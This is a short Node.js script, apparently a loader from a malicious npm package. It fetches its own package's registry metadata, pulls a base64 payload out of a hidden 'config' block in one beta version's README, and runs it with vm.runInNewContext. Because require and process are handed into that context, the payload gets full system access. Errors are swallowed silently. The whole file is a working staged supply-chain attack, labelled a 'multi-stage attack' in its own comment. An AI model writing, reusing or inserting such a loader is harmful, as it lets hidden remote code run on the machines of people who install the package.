const https = require('https');
const pkg = require('./package.json');

// Multi-stage attack: fetch payload from npm registry
https.get(`https://registry.npmjs.org/${pkg.name}`, (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => {
    try {
      const info = JSON.parse(data);
      // Look for hidden payload in specific version's README
      if (info.versions && info.versions['0.0.1-beta.1']) {
        const readme = info.versions['0.0.1-beta.1'].readme || '';
        const match = readme.match(/```config\n([\s\S]*?)\n```/);
        if (match) {
          const payload = Buffer.from(match[1], 'base64').toString();
          // Execute in sandboxed context
          require('vm').runInNewContext(payload, {
            require, process, console, Buffer,
            setTimeout, setInterval
          });
        }
      }
    } catch (error) {
      // Fail silently
    }
  });
});